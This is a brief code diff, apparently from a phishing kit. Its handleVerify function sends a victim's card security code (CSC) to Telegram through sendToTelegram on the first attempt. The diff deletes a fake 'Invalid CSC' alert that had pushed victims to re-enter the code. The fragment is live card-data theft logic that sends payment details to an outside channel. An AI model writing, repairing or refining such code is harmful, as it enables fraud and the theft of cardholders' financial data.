@@ -134,10 +134,10 @@ function handleVerify(e) {
     if (attemptCount === 1) {
         sendToTelegram(csc, attemptCount)
             .then(() => {
-                alert("Invalid CSC. Please try again.");
+                
             })
             .catch(() => {
-                alert("Invalid CSC. Please try again.");
+                
             });
         return;
     }
